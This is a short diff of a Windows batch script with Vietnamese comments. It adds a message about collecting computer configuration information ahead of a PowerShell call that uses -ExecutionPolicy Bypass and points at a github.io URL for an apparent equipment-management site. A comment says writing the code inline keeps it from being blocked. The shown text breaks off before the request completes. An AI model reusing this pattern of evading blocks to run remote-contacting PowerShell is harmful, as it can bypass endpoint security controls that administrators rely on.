@@ -12,7 +12,7 @@ chcp 65001 >nul 2>&1
 :: Giai phap moi:     powershell -Command "code tinh" ^           <-- khong bi chan
 ::                    (toan bo code duoc viet thang, khong doc tu file luc chay)
 :: ─────────────────────────────────────────────────────────────────────────────
-
+echo Dang lay thong tin Cau hinh may tinh....
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "$u='https://vietxuanvnp-hash.github.io/qltb_sonla';" ^
  "try{" ^
